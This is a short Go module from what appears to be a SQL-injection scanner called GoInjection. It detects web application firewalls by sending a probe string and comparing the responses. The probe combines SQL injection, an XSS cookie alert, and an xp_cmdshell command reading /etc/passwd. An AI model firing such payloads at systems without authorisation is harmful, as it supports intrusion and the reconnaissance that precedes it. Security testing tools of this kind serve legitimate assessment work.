package modules

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/structs"
	"GoInjection/backend/waf"
)

var wafPayload = "' OR 1=1; UNION SELECT NULL, NULL, CONCAT('<img src=\"x\" onerror=\"alert(document.cookie)\">', table_name) FROM information_schema.tables WHERE 'a'='a' -- -; EXEC xp_cmdshell('cat /etc/passwd')--\n"

func DetectWAF(url, originalUrl string) (string, string) {
	responseWithPayload, statusCodeWithPayload := helper.SendRequest(originalUrl + helper.URLEncode(wafPayload))
	structs.WAFLinks++
	responseWithoutPayload, statusCodeWithoutPayload := helper.SendRequest(originalUrl)
	structs.WAFLinks++

	if responseWithPayload != responseWithoutPayload {
		return "Potential", "Response changed"
	}

	if statusCodeWithPayload != statusCodeWithoutPayload {
		return "Potential", "Status code changed"
	}

	var isWAF, wafDetection = waf.DetectWAF(url)
	if isWAF {
		return "True", wafDetection
	}

	return "False", ""
}
